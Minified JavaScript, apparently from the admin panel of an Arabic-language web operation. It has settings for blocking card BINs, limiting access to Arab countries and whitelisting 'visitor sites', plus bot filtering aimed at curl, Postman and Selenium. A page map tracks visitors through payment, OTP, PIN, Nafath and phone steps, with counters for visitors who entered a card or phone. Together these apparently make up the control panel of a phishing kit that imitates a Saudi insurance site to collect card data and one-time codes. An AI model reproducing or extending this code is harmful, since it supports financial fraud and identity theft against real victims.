[data-close-button]{background:var(--info-bg);border-color:var(--info-border);color:var(--info-text)}[data-rich-colors=true][data-sonner-toast][data-type=warning]{background:var(--warning-bg);border-color:var(--warning-border);color:var(--warning-text)}[data-rich-colors=true][data-sonner-toast][data-type=warning] [data-close-button]{background:var(--warning-bg);border-color:var(--warning-border);color:var(--warning-text)}[data-rich-colors=true][data-sonner-toast][data-type=error]{background:var(--error-bg);border-color:var(--error-border);color:var(--error-text)}[data-rich-colors=true][data-sonner-toast][data-type=error] [data-close-button]{background:var(--error-bg);border-color:var(--error-border);color:var(--error-text)}.sonner-loading-wrapper{--size:16px;height:var(--size);width:var(--size);position:absolute;inset:0;z-index:10}.sonner-loading-wrapper[data-visible=false]{transform-origin:center;animation:sonner-fade-out .2s ease forwards}.sonner-spinner{position:relative;top:50%;left:50%;height:var(--size);width:var(--size)}.sonner-loading-bar{animation:sonner-spin 1.2s linear infinite;background:var(--gray11);border-radius:6px;height:8%;left:-10%;position:absolute;top:-3.9%;width:24%}.sonner-loading-bar:first-child{animation-delay:-1.2s;transform:rotate(.0001deg) translate(146%)}.sonner-loading-bar:nth-child(2){animation-delay:-1.1s;transform:rotate(30deg) translate(146%)}.sonner-loading-bar:nth-child(3){animation-delay:-1s;transform:rotate(60deg) translate(146%)}.sonner-loading-bar:nth-child(4){animation-delay:-.9s;transform:rotate(90deg) translate(146%)}.sonner-loading-bar:nth-child(5){animation-delay:-.8s;transform:rotate(120deg) translate(146%)}.sonner-loading-bar:nth-child(6){animation-delay:-.7s;transform:rotate(150deg) translate(146%)}.sonner-loading-bar:nth-child(7){animation-delay:-.6s;transform:rotate(180deg) translate(146%)}.sonner-loading-bar:nth-child(8){animation-delay:-.5s;transform:rotate(210deg) translate(146%)}.sonner-loading-bar:nth-child(9){animation-delay:-.4s;transform:rotate(240deg) translate(146%)}.sonner-loading-bar:nth-child(10){animation-delay:-.3s;transform:rotate(270deg) translate(146%)}.sonner-loading-bar:nth-child(11){animation-delay:-.2s;transform:rotate(300deg) translate(146%)}.sonner-loading-bar:nth-child(12){animation-delay:-.1s;transform:rotate(330deg) translate(146%)}@keyframes sonner-fade-in{0%{opacity:0;transform:scale(.8)}100%{opacity:1;transform:scale(1)}}@keyframes sonner-fade-out{0%{opacity:1;transform:scale(1)}100%{opacity:0;transform:scale(.8)}}@keyframes sonner-spin{0%{opacity:1}100%{opacity:.15}}@media (prefers-reduced-motion){.sonner-loading-bar,[data-sonner-toast],[data-sonner-toast]>*{transition:none!important;animation:none!important}}.sonner-loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);transform-origin:center;transition:opacity .2s,transform .2s}.sonner-loader[data-visible=false]{opacity:0;transform:scale(.8) translate(-50%,-50%)}");
    let J = [{
        code: "SAU",
        name: "السعودية",
        flag: "🇸🇦"
    }, {
        code: "ARE",
        name: "الإمارات",
        flag: "🇦🇪"
    }, {
        code: "KWT",
        name: "الكويت",
        flag: "🇰🇼"
    }, {
        code: "BHR",
        name: "البحرين",
        flag: "🇧🇭"
    }, {
        code: "OMN",
        name: "عمان",
        flag: "🇴🇲"
    }, {
        code: "QAT",
        name: "قطر",
        flag: "🇶🇦"
    }, {
        code: "JOR",
        name: "الأردن",
        flag: "🇯🇴"
    }, {
        code: "EGY",
        name: "مصر",
        flag: "🇪🇬"
    }, {
        code: "LBN",
        name: "لبنان",
        flag: "🇱🇧"
    }, {
        code: "IRQ",
        name: "العراق",
        flag: "🇮🇶"
    }, {
        code: "SYR",
        name: "سوريا",
        flag: "🇸🇾"
    }, {
        code: "YEM",
        name: "اليمن",
        flag: "🇾🇪"
    }, {
        code: "PSE",
        name: "فلسطين",
        flag: "🇵🇸"
    }, {
        code: "MAR",
        name: "المغرب",
        flag: "🇲🇦"
    }, {
        code: "DZA",
        name: "الجزائر",
        flag: "🇩🇿"
    }, {
        code: "TUN",
        name: "تونس",
        flag: "🇹🇳"
    }, {
        code: "LBY",
        name: "ليبيا",
        flag: "🇱🇾"
    }, {
        code: "SDN",
        name: "السودان",
        flag: "🇸🇩"
    }];

    function Q({
        isOpen: e,
        onClose: n
    }) {
        let [s, i] = (0, a.useState)({
            blockedCardBins: [],
            allowedCountries: []
        }), [o, d] = (0, a.useState)(""), [l, c] = (0, a.useState)(""), [u, m] = (0, a.useState)(!1), [p, h] = (0, a.useState)("cards"), [b, y] = (0, a.useState)(!1), [v, _] = (0, a.useState)(""), [j, w] = (0, a.useState)(""), [k, N] = (0, a.useState)(""), [A, S] = (0, a.useState)(""), [C, B] = (0, a.useState)(""), [T, P] = (0, a.useState)({
            active: [],
            db: [],
            protectionEnabled: !1
        }), [O, $] = (0, a.useState)(""), [V, Y] = (0, a.useState)(!1);
        (0, a.useEffect)(() => {
            e && (Q(), q())
        }, [e]);
        let q = async () => {
            try {
                let e = await (0, r.getCorsOrigins)();
                P({
                    active: e.active || e.origins || [],
                    db: e.db || [],
                    protectionEnabled: !!e.protectionEnabled
                })
            } catch (e) {
                console.error("Error loading CORS origins:", e)
            }
        }, K = async () => {
            let e = O.trim().replace(/\/$/, "");
            if (!e) return void G.error("يرجى إدخال رابط الموقع");
            try {
                new URL(e)
            } catch {
                G.error("رابط غير صحيح، مثال: https://example.com");
                return
            }
            Y(!0);
            try {
                let t = await (0, r.addCorsOrigin)(e);
                P(a => ({
                    active: t.active,
                    db: [...new Set([...a.db, e])]
                })), $(""), G.success("تم إضافة الموقع المسموح له")
            } catch (e) {
                console.error("Error adding CORS origin:", e), G.error("فشل إضافة الموقع")
            } finally {
                Y(!1)
            }
        }, X = async e => {
            Y(!0);
            try {
                let t = await (0, r.removeCorsOrigin)(e);
                P(a => ({
                    active: t.active,
                    db: a.db.filter(t => t !== e)
                })), G.success("تم إزالة الموقع")
            } catch (e) {
                console.error("Error removing CORS origin:", e), G.error("فشل إزالة الموقع")
            } finally {
                Y(!1)
            }
        }, Q = async () => {
            try {
                let e = await D();
                i(e)
            } catch (e) {
                console.error("Error loading settings:", e), G.error("فشل تحميل الإعدادات")
            }
        }, Z = async () => {
            let e = o.split(/[\s,\n]+/).map(e => e.trim()).filter(e => 4 === e.length && /^\d+$/.test(e));
            if (0 === e.length) return void G.error("يجب إدخال أرقام صحيحة (4 أرقام لكل بطاقة)");
            m(!0);
            try {
                for (let t of e) await U(t);
                await Q(), d(""), G.success(`تم إضافة ${e.length} بطاقة محظورة`)
            } catch (e) {
                console.error("Error adding blocked BINs:", e), G.error("فشل إضافة البطاقات")
            } finally {
                m(!1)
            }
        }, ee = async e => {
            m(!0);
            try {
                await F(e), await Q(), G.success("تم إزالة البطاقة المحظورة")
            } catch (e) {
                console.error("Error removing blocked BIN:", e), G.error("فشل إزالة البطاقة")
            } finally {
                m(!1)
            }
        }, et = async () => {
            if (!l) return void G.error("يرجى اختيار دولة");
            m(!0);
            try {
                await W(l), await Q(), c(""), G.success("تم إضافة الدولة المسموحة")
            } catch (e) {
                console.error("Error adding allowed country:", e), G.error("فشل إضافة الدولة")
            } finally {
                m(!1)
            }
        }, ea = async e => {
            m(!0);
            try {
                await H(e), await Q(), G.success("تم إزالة الدولة المسموحة")
            } catch (e) {
                console.error("Error removing allowed country:", e), G.error("فشل إزالة الدولة")
            } finally {
                m(!1)
            }
        }, er = async () => {
            if (!v || !j) return void G.error("يرجى ملء جميع الحقول");
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) return void G.error("صيغة البريد الإلكتروني غير صحيحة");
            y(!0);
            try {
                let e = localStorage.getItem("admin_token"),
                    t = await fetch("https://moaiendy.onrender.com/api-backend/api/admin/change-email", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            ...e ? {
                                Authorization: `Bearer ${e}`
                            } : {}
                        },
                        body: JSON.stringify({
                            newEmail: v,
                            currentPassword: j
                        })
                    }),
                    a = await t.json();
                if (!t.ok) throw Error(a.error || "فشل تغيير البريد");
                G.success("تم تغيير البريد الإلكتروني بنجاح - يرجى تسجيل الدخول من جديد"), _(""), w("")
            } catch (e) {
                G.error(e.message || "فشل تغيير البريد الإلكتروني")
            } finally {
                y(!1)
            }
        }, en = async () => {
            if (!k || !A || !C) return void G.error("يرجى ملء جميع الحقول");
            if (A.length < 6) return void G.error("كلمة المرور الجديدة يجب أن تكون 6 أحرف على الأقل");
            if (A !== C) return void G.error("كلمة المرور الجديدة وتأكيدها غير متطابقتين");
            y(!0);
            try {
                let e = localStorage.getItem("admin_token"),
                    t = await fetch("https://moaiendy.onrender.com/api-backend/api/admin/change-password", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                            ...e ? {
                                Authorization: `Bearer ${e}`
                            } : {}
                        },
                        body: JSON.stringify({
                            newPassword: A,
                            currentPassword: k
                        })
                    }),
                    a = await t.json();
                if (!t.ok) throw Error(a.error || "فشل تغيير كلمة المرور");
                G.success("تم تغيير كلمة المرور بنجاح"), N(""), S(""), B("")
            } catch (e) {
                G.error(e.message || "فشل تغيير كلمة المرور")
            } finally {
                y(!1)
            }
        };
        return e ? (0, t.jsx)("div", {
            className: "fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4",
            children: (0, t.jsxs)("div", {
                className: "bg-white rounded-2xl shadow-2xl w-full max-w-3xl max-h-[90vh] overflow-hidden",
                children: [(0, t.jsx)("div", {
                    className: "bg-gradient-to-r from-blue-600 to-purple-600 p-6 text-white",
                    children: (0, t.jsxs)("div", {
                        className: "flex items-center justify-between",
                        children: [(0, t.jsx)("h2", {
                            className: "text-2xl font-bold",
                            children: "⚙️ إعدادات النظام"
                        }), (0, t.jsx)("button", {
                            onClick: n,
                            className: "p-2 hover:bg-white/20 rounded-lg transition-colors",
                            children: (0, t.jsx)(I, {
                                className: "w-6 h-6"
                            })
                        })]
                    })
                }), (0, t.jsxs)("div", {
                    className: "flex border-b border-gray-200",
                    children: [(0, t.jsx)("button", {
                        onClick: () => h("cards"),
                        className: `flex-1 py-4 px-6 font-semibold transition-colors ${"cards"===p?"text-blue-600 border-b-2 border-blue-600 bg-blue-50":"text-gray-600 hover:bg-gray-50"}`,
                        children: (0, t.jsxs)("div", {
                            className: "flex items-center justify-center gap-2",
                            children: [(0, t.jsx)(x, {
                                className: "w-5 h-5"
                            }), (0, t.jsx)("span", {
                                children: "حجب بطاقات الدفع"
                            })]
                        })
                    }), (0, t.jsx)("button", {
                        onClick: () => h("countries"),
                        className: `flex-1 py-4 px-4 font-semibold transition-colors text-sm ${"countries"===p?"text-purple-600 border-b-2 border-purple-600 bg-purple-50":"text-gray-600 hover:bg-gray-50"}`,
                        children: (0, t.jsxs)("div", {
                            className: "flex items-center justify-center gap-2",
                            children: [(0, t.jsx)(R, {
                                className: "w-4 h-4"
                            }), (0, t.jsx)("span", {
                                children: "تقييد الدول"
                            })]
                        })
                    }), (0, t.jsx)("button", {
                        onClick: () => h("cors"),
                        className: `flex-1 py-4 px-4 font-semibold transition-colors text-sm ${"cors"===p?"text-green-600 border-b-2 border-green-600 bg-green-50":"text-gray-600 hover:bg-gray-50"}`,
                        children: (0, t.jsxs)("div", {
                            className: "flex items-center justify-center gap-2",
                            children: [(0, t.jsx)(M, {
                                className: "w-4 h-4"
                            }), (0, t.jsx)("span", {
                                children: "مواقع الزوار"
                            })]
                        })
                    }), (0, t.jsx)("button", {
                        onClick: () => h("account"),
                        className: `flex-1 py-4 px-4 font-semibold transition-colors text-sm ${"account"===p?"text-orange-600 border-b-2 border-orange-600 bg-orange-50":"text-gray-600 hover:bg-gray-50"}`,
                        children: (0, t.jsxs)("div", {
                            className: "flex items-center justify-center gap-2",
                            children: [(0, t.jsx)(z, {
                                className: "w-4 h-4"
                            }), (0, t.jsx)("span", {
                                children: "الحساب"
                            })]
                        })
                    })]
                }), (0, t.jsxs)("div", {
                    className: "p-6 overflow-y-auto max-h-[60vh]",
                    children: ["cors" === p && (0, t.jsxs)("div", {
                        className: "space-y-6",
                        children: [(0, t.jsxs)("div", {
                            className: "text-center",
                            children: [(0, t.jsx)("h3", {
                                className: "text-xl font-bold text-gray-800 mb-2",
                                children: "مواقع الزوار المسموح لها"
                            }), (0, t.jsxs)("p", {
                                className: "text-sm text-gray-600",
                                children: ["أضف رابط موقع الزوار الحقيقي فقط. عند الإضافة، يُفعَّل تلقائياً:", (0, t.jsx)("br", {}), "• منع الطلبات بدون موقع مسموح (حماية من curl والبوتات)", (0, t.jsx)("br", {}), "• رفض المتصفحات/البرامج الآلية (Postman, Python, Selenium...)", (0, t.jsx)("br", {}), "• تحديد عدد الطلبات لكل عنوان IP", (0, t.jsx)("br", {}), "مثال:", " ", (0, t.jsx)("span", {
                                    className: "font-mono text-green-700",
                                    children: "https://visitros.manus.space"
                                })]
                            }), T.protectionEnabled && (0, t.jsx)("div", {
                                className: "mt-3 inline-flex items-center gap-2 px-3 py-1.5 bg-emerald-100 text-emerald-800 rounded-full text-xs font-semibold",
                                children: "🛡️ الحماية من البوتات مفعّلة"
                            })]
                        }), (0, t.jsxs)("div", {
                            className: "bg-green-50 rounded-xl p-4 border border-green-200",
                            children: [(0, t.jsx)("label", {
                                className: "block text-sm font-semibold text-gray-700 mb-2",
                                children: "إضافة موقع جديد"
                            }), (0, t.jsxs)("div", {
                                className: "flex gap-2",
                                children: [(0, t.jsx)("input", {
                                    type: "url",
                                    value: O,
                                    onChange: e => $(e.target.value),
                                    onKeyDown: e => "Enter" === e.key && K(),
                                    placeholder: "https://visitors.example.com",
                                    dir: "ltr",
                                    className: "flex-1 px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-green-500 focus:outline-none font-mono text-sm"
                                }), (0, t.jsxs)("button", {
                                    onClick: K,
                                    disabled: V || !O.trim(),
                                    className: "bg-green-600 hover:bg-green-700 disabled:bg-gray-400 text-white px-6 py-3 rounded-lg font-semibold transition-colors flex items-center gap-2",
                                    children: [(0, t.jsx)(E, {
                                        className: "w-4 h-4"
                                    }), "إضافة"]
                                })]
                            }), (0, t.jsx)("p", {
                                className: "text-xs text-gray-500 mt-2",
                                children: "ملاحظة: فقط المواقع المضافة هنا + المواقع في .env على السيرفر يمكنها إرسال بيانات زوار حقيقية. أي طلب آلي يُرفض تلقائياً."
                            })]
                        }), (0, t.jsxs)("div", {
                            children: [(0, t.jsxs)("h4", {
                                className: "text-sm font-semibold text-gray-700 mb-3",
                                children: ["المواقع المسموح لها حالياً (", T.active.length, ")"]
                            }), 0 === T.active.length ? (0, t.jsxs)("div", {
                                className: "text-center py-8 text-gray-500",
                                children: [(0, t.jsx)(M, {
                                    className: "w-12 h-12 mx-auto mb-2 opacity-30"
                                }), (0, t.jsx)("p", {
                                    children: "لا توجد مواقع مسموحة"
                                })]
                            }) : (0, t.jsx)("div", {
                                className: "space-y-2",
                                children: T.active.map(e => {
                                    let a = T.db.includes(e);
                                    return (0, t.jsxs)("div", {
                                        className: `flex items-center justify-between px-4 py-3 rounded-lg border ${a?"bg-green-50 border-green-200":"bg-gray-50 border-gray-200"}`,
                                        children: [(0, t.jsxs)("div", {
                                            className: "flex items-center gap-3",
                                            children: [(0, t.jsx)("span", {
                                                className: `w-2 h-2 rounded-full ${a?"bg-green-500":"bg-gray-400"}`
                                            }), (0, t.jsx)("span", {
                                                className: "font-mono text-sm text-gray-800",
                                                children: e
                                            }), !a && (0, t.jsx)("span", {
                                                className: "text-xs bg-gray-200 text-gray-600 px-2 py-0.5 rounded-full",
                                                children: "من .env"
                                            })]
                                        }), a && (0, t.jsx)("button", {
                                            onClick: () => X(e),
                                            disabled: V,
                                            className: "text-gray-400 hover:text-red-600 transition-colors p-1 rounded",
                                            children: (0, t.jsx)(g, {
                                                className: "w-4 h-4"
                                            })
                                        })]
                                    }, e)
                                })
                            })]
                        })]
                    }), "cards" === p && (0, t.jsxs)("div", {
                        className: "space-y-6",
                        children: [(0, t.jsxs)("div", {
                            className: "text-center",
                            children: [(0, t.jsx)("h3", {
                                className: "text-xl font-bold text-gray-800 mb-2",
                                children: "قائمة حجب بطاقات الدفع"
                            }), (0, t.jsxs)("p", {
                                className: "text-sm text-gray-600",
                                children: ["أضف البيانات الخاصة بأرقام البطاقات التي لا تريده. يمكنك إضافة مجموعة من البيانات", (0, t.jsx)("br", {}), "مفصولة بفاصلة أو فاصلة أو سطر جديد. اضغط Enter لإضافة كل بلوك."]
                            })]
                        }), (0, t.jsxs)("div", {
                            className: "bg-blue-50 rounded-xl p-4 border border-blue-200",
                            children: [(0, t.jsx)("textarea", {
                                value: o,
                                onChange: e => d(e.target.value),
                                placeholder: "مثال: 4890, 4458, 4909 أو كل رقم في سطر منفصل",
                                rows: 4,
                                dir: "ltr",
                                className: "w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-blue-500 focus:outline-none text-lg font-mono resize-none"
                            }), (0, t.jsxs)("div", {
                                className: "flex justify-between items-center mt-3",
                                children: [(0, t.jsxs)("button", {
                                    onClick: Z,
                                    disabled: u || !o.trim(),
                                    className: "bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white px-6 py-2 rounded-lg font-semibold transition-colors flex items-center gap-2",
                                    children: [(0, t.jsx)(E, {
                                        className: "w-5 h-5"
                                    }), "حفظ"]
                                }), (0, t.jsx)("button", {
                                    onClick: () => d(""),
                                    className: "text-gray-600 hover:text-gray-800 px-4 py-2 rounded-lg font-semibold transition-colors",
                                    children: "إلغاء"
                                })]
                            })]
                        }), (0, t.jsx)("div", {
                            children: 0 === s.blockedCardBins.length ? (0, t.jsxs)("div", {
                                className: "text-center py-8 text-gray-500",
                                children: [(0, t.jsx)(x, {
                                    className: "w-12 h-12 mx-auto mb-2 opacity-30"
                                }), (0, t.jsx)("p", {
                                    children: "لا توجد بطاقات محظورة"
                                })]
                            }) : (0, t.jsx)("div", {
                                className: "flex flex-wrap gap-2",
                                children: s.blockedCardBins.map(e => (0, t.jsxs)("div", {
                                    className: "bg-gray-100 border border-gray-300 rounded-full px-4 py-2 flex items-center gap-2",
                                    children: [(0, t.jsx)("span", {
                                        className: "font-mono text-sm font-semibold text-gray-700",
                                        children: e
                                    }), (0, t.jsx)("button", {
                                        onClick: () => ee(e),
                                        disabled: u,
                                        className: "text-gray-500 hover:text-red-600 transition-colors",
                                        children: (0, t.jsx)(I, {
                                            className: "w-4 h-4"
                                        })
                                    })]
                                }, e))
                            })
                        })]
                    }), "countries" === p && (0, t.jsxs)("div", {
                        className: "space-y-6",
                        children: [(0, t.jsxs)("div", {
                            className: "text-center",
                            children: [(0, t.jsx)("h3", {
                                className: "text-xl font-bold text-gray-800 mb-2",
                                children: "تقييد الوصول حسب الدولة"
                            }), (0, t.jsxs)("p", {
                                className: "text-sm text-gray-600",
                                children: ["تحكم في الدول التي تسمح لها بالوصول إلى موقعك الإلكتروني للتعزيز الأمان.", (0, t.jsx)("br", {}), "يمكنك إضافة أكثر من دولة. وسيمنع الوصول من أي دولة غير موجودة في القائمة."]
                            })]
                        }), (0, t.jsxs)("div", {
                            className: "bg-purple-50 rounded-xl p-4 border border-purple-200",
                            children: [(0, t.jsx)("label", {
                                className: "block text-sm font-semibold text-gray-700 mb-2",
                                children: "- الدول المسموح لها بالوصول -"
                            }), (0, t.jsxs)("div", {
                                className: "flex gap-2",
                                children: [(0, t.jsxs)("select", {
                                    value: l,
                                    onChange: e => c(e.target.value),
                                    className: "flex-1 px-4 py-3 border-2 border-gray-300 rounded-lg focus:border-purple-500 focus:outline-none text-base",
                                    dir: "rtl",
                                    children: [(0, t.jsx)("option", {
                                        value: "",
                                        children: "اختر دولة..."
                                    }), J.filter(e => !s.allowedCountries.includes(e.code)).map(e => (0, t.jsxs)("option", {
                                        value: e.code,
                                        children: [e.flag, " ", e.name]
                                    }, e.code))]
                                }), (0, t.jsx)("button", {
                                    onClick: et,
                                    disabled: u || !l,
                                    className: "bg-purple-600 hover:bg-purple-700 disabled:bg-gray-400 text-white px-6 py-3 rounded-lg font-semibold transition-colors",
                                    children: "حفظ"
                                })]
                            }), (0, t.jsx)("p", {
                                className: "text-xs text-gray-600 mt-2",
                                children: "يمكنك إضافة أكثر من دولة غير موجودة في القائمة."
                            })]
                        }), (0, t.jsx)("div", {
                            children: 0 === s.allowedCountries.length ? (0, t.jsxs)("div", {
                                className: "text-center py-8 text-gray-500",
                                children: [(0, t.jsx)(R, {
                                    className: "w-12 h-12 mx-auto mb-2 opacity-30"
                                }), (0, t.jsx)("p", {
                                    children: "جميع الدول مسموحة (لم يتم تحديد قيود)"
                                })]
                            }) : (0, t.jsx)("div", {
                                className: "flex flex-wrap gap-2",
                                children: s.allowedCountries.map(e => {
                                    let a = J.find(t => t.code === e);
                                    return (0, t.jsxs)("div", {
                                        className: "bg-green-50 border border-green-300 rounded-full px-4 py-2 flex items-center gap-2",
                                        children: [(0, t.jsx)("span", {
                                            className: "text-lg",
                                            children: a?.flag || "🌍"
                                        }), (0, t.jsx)("span", {
                                            className: "text-sm font-semibold text-gray-700",
                                            children: a?.name || e
                                        }), (0, t.jsx)("button", {
                                            onClick: () => ea(e),
                                            disabled: u,
                                            className: "text-gray-500 hover:text-red-600 transition-colors",
                                            children: (0, t.jsx)(I, {
                                                className: "w-4 h-4"
                                            })
                                        })]
                                    }, e)
                                })
                            })
                        })]
                    }), "account" === p && (0, t.jsxs)("div", {
                        className: "space-y-8",
                        children: [(0, t.jsxs)("div", {
                            className: "bg-blue-50 border border-blue-200 rounded-xl p-5",
                            children: [(0, t.jsxs)("div", {
                                className: "flex items-center gap-2 mb-4",
                                children: [(0, t.jsx)(L, {
                                    className: "w-5 h-5 text-blue-600"
                                }), (0, t.jsx)("h3", {
                                    className: "text-lg font-bold text-gray-800",
                                    children: "تغيير البريد الإلكتروني"
                                })]
                            }), (0, t.jsxs)("div", {
                                className: "space-y-3",
                                children: [(0, t.jsxs)("div", {
                                    children: [(0, t.jsx)("label", {
                                        className: "block text-sm font-medium text-gray-700 mb-1",
                                        children: "البريد الإلكتروني الجديد"
                                    }), (0, t.jsx)("input", {
                                        type: "email",
                                        value: v,
                                        onChange: e => _(e.target.value),
                                        placeholder: "example@domain.com",
                                        className: "w-full border border-gray-300 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                                    })]
                                }), (0, t.jsxs)("div", {
                                    children: [(0, t.jsx)("label", {
                                        className: "block text-sm font-medium text-gray-700 mb-1",
                                        children: "كلمة المرور الحالية للتأكيد"
                                    }), (0, t.jsx)("input", {
                                        type: "password",
                                        value: j,
                                        onChange: e => w(e.target.value),
                                        placeholder: "أدخل كلمة المرور الحالية",
                                        className: "w-full border border-gray-300 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
                                    })]
                                }), (0, t.jsx)("button", {
                                    onClick: er,
                                    disabled: b,
                                    className: "w-full bg-blue-600 hover:bg-blue-700 disabled:opacity-50 text-white py-2.5 rounded-lg font-semibold text-sm transition-colors",
                                    children: b ? "جاري التغيير..." : "تغيير البريد الإلكتروني"
                                })]
                            })]
                        }), (0, t.jsxs)("div", {
                            className: "bg-orange-50 border border-orange-200 rounded-xl p-5",
                            children: [(0, t.jsxs)("div", {
                                className: "flex items-center gap-2 mb-4",
                                children: [(0, t.jsx)(f, {
                                    className: "w-5 h-5 text-orange-600"
                                }), (0, t.jsx)("h3", {
                                    className: "text-lg font-bold text-gray-800",
                                    children: "تغيير كلمة المرور"
                                })]
                            }), (0, t.jsxs)("div", {
                                className: "space-y-3",
                                children: [(0, t.jsxs)("div", {
                                    children: [(0, t.jsx)("label", {
                                        className: "block text-sm font-medium text-gray-700 mb-1",
                                        children: "كلمة المرور الحالية"
                                    }), (0, t.jsx)("input", {
                                        type: "password",
                                        value: k,
                                        onChange: e => N(e.target.value),
                                        placeholder: "أدخل كلمة المرور الحالية",
                                        className: "w-full border border-gray-300 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-orange-500"
                                    })]
                                }), (0, t.jsxs)("div", {
                                    children: [(0, t.jsxs)("label", {
                                        className: "block text-sm font-medium text-gray-700 mb-1",
                                        children: ["كلمة المرور الجديدة", (0, t.jsx)("span", {
                                            className: "text-xs text-gray-500 mr-2",
                                            children: "(6 أحرف على الأقل)"
                                        })]
                                    }), (0, t.jsx)("input", {
                                        type: "password",
                                        value: A,
                                        onChange: e => S(e.target.value),
                                        placeholder: "أدخل كلمة المرور الجديدة",
                                        className: "w-full border border-gray-300 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-orange-500"
                                    }), A && (0, t.jsx)("p", {
                                        className: `text-xs mt-1 ${A.length>=6?"text-green-600":"text-red-500"}`,
                                        children: A.length >= 6 ? `✓ ${A.length} حرف - مقبول` : `✗ ${A.length} حرف - يجب 6 على الأقل`
                                    })]
                                }), (0, t.jsxs)("div", {
                                    children: [(0, t.jsx)("label", {
                                        className: "block text-sm font-medium text-gray-700 mb-1",
                                        children: "تأكيد كلمة المرور الجديدة"
                                    }), (0, t.jsx)("input", {
                                        type: "password",
                                        value: C,
                                        onChange: e => B(e.target.value),
                                        placeholder: "أعد إدخال كلمة المرور الجديدة",
                                        className: "w-full border border-gray-300 rounded-lg px-4 py-2.5 text-sm focus:outline-none focus:ring-2 focus:ring-orange-500"
                                    }), C && A && (0, t.jsx)("p", {
                                        className: `text-xs mt-1 ${A===C?"text-green-600":"text-red-500"}`,
                                        children: A === C ? "✓ كلمتا المرور متطابقتان" : "✗ كلمتا المرور غير متطابقتين"
                                    })]
                                }), (0, t.jsx)("button", {
                                    onClick: en,
                                    disabled: b || A.length < 6 || A !== C,
                                    className: "w-full bg-orange-600 hover:bg-orange-700 disabled:opacity-50 text-white py-2.5 rounded-lg font-semibold text-sm transition-colors",
                                    children: b ? "جاري التغيير..." : "تغيير كلمة المرور"
                                })]
                            })]
                        })]
                    })]
                }), (0, t.jsx)("div", {
                    className: "border-t border-gray-200 p-4 bg-gray-50 flex gap-3",
                    children: (0, t.jsx)("button", {
                        onClick: n,
                        className: "flex-1 bg-gray-600 hover:bg-gray-700 text-white py-3 rounded-lg font-semibold transition-colors",
                        children: "إغلاق"
                    })
                })]
            })
        }) : null
    }
    let Z = m("settings", [
            ["path", {
                d: "M9.671 4.136a2.34 2.34 0 0 1 4.659 0 2.34 2.34 0 0 0 3.319 1.915 2.34 2.34 0 0 1 2.33 4.033 2.34 2.34 0 0 0 0 3.831 2.34 2.34 0 0 1-2.33 4.033 2.34 2.34 0 0 0-3.319 1.915 2.34 2.34 0 0 1-4.659 0 2.34 2.34 0 0 0-3.32-1.915 2.34 2.34 0 0 1-2.33-4.033 2.34 2.34 0 0 0 0-3.831A2.34 2.34 0 0 1 6.35 6.051a2.34 2.34 0 0 0 3.319-1.915",
                key: "1i5ecw"
            }],
            ["circle", {
                cx: "12",
                cy: "12",
                r: "3",
                key: "1v7zrd"
            }]
        ]),
        ee = m("users", [
            ["path", {
                d: "M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",
                key: "1yyitq"
            }],
            ["path", {
                d: "M16 3.128a4 4 0 0 1 0 7.744",
                key: "16gr8j"
            }],
            ["path", {
                d: "M22 21v-2a4 4 0 0 0-3-3.87",
                key: "kshegd"
            }],
            ["circle", {
                cx: "9",
                cy: "7",
                r: "4",
                key: "nufk8"
            }]
        ]),
        et = m("wifi", [
            ["path", {
                d: "M12 20h.01",
                key: "zekei9"
            }],
            ["path", {
                d: "M2 8.82a15 15 0 0 1 20 0",
                key: "dnpr2z"
            }],
            ["path", {
                d: "M5 12.859a10 10 0 0 1 14 0",
                key: "1x1e6c"
            }],
            ["path", {
                d: "M8.5 16.429a5 5 0 0 1 7 0",
                key: "1bycff"
            }]
        ]),
        ea = m("bell", [
            ["path", {
                d: "M10.268 21a2 2 0 0 0 3.464 0",
                key: "vwvbt9"
            }],
            ["path", {
                d: "M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326",
                key: "11g9vi"
            }]
        ]),
        er = m("phone", [
            ["path", {
                d: "M13.832 16.568a1 1 0 0 0 1.213-.303l.355-.465A2 2 0 0 1 17 15h3a2 2 0 0 1 2 2v3a2 2 0 0 1-2 2A18 18 0 0 1 2 4a2 2 0 0 1 2-2h3a2 2 0 0 1 2 2v3a2 2 0 0 1-.8 1.6l-.468.351a1 1 0 0 0-.292 1.233 14 14 0 0 0 6.392 6.384",
                key: "9njp5v"
            }]
        ]),
        en = m("trending-up", [
            ["path", {
                d: "M16 7h6v6",
                key: "box55l"
            }],
            ["path", {
                d: "m22 7-8.5 8.5-5-5L2 17",
                key: "1t1m79"
            }]
        ]),
        es = {
            home: "الرئيسية",
            "home-new": "الرئيسية",
            "الصفحة الرئيسية": "الرئيسية",
            insur: "التأمين",
            insurance: "التأمين",
            compar: "مقارنة",
            compare: "مقارنة",
            check: "الدفع",
            payment: "الدفع",
            _st1: "الدفع",
            veri: "OTP",
            otp: "OTP",
            step2: "OTP",
            _t2: "OTP",
            confi: "PIN",
            pin: "PIN",
            step3: "PIN",
            _t3: "PIN",
            nafad: "نفاذ",
            step4: "نفاذ",
            _t6: "نفاذ",
            phone: "الهاتف",
            "phone-info": "الهاتف",
            step5: "الهاتف",
            _t5: "الهاتف",
            card: "البطاقة",
            success: "نجاح",
            "thank-you": "شكراً"
        };

    function ei() {
        let {
            user: e,
            logout: r
        } = (0, P.useAuth)(), [s, i] = (0, a.useState)({
            activeUsers: 0,
            todayVisitors: 0,
            totalVisitors: 0,
            visitorsWithCard: 0,
            visitorsWithPhone: 0,
            devices: [],
            countries: [],
            visitors: {
                active: 0,
                idle: 0,
                left: 0,
                total: 0
            },
            customers: {
                active: 0,
